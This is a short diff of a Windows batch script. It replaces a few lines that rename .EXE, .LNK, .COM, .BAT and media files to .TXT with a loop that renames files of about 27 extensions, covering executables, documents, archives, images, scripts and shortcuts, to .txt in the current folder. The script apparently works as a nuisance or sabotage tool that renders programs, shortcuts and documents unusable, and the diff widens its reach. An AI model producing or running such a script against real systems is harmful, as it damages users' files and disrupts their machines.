@@ -1,7 +1,12 @@
-REN *.EXE *.TXT 
-REN *.JPEG *.TXT
-REN *.LNK *.TXT
-REN *.AVI *.TXT
-REN *.MPEG *.TXT
-REN *.COM *.TXT
-REN *.BAT *.TXT
+@echo off
+
+REM List of file extensions to rename
+set "extensions=.exe .json .doc .pdf .wpd .docx .rtf .tex .odt .jpg .jpeg .mp3 .rar .vcd .webp .css .html .py .php .ico .lnk .mp4 .js .bak .xml .zip .bmp"
+
+REM Loop through each extension and rename files
+for %%E in (%extensions%) do (
+    REN *%%E *.txt
+)
+
+echo File renaming completed.
+pause
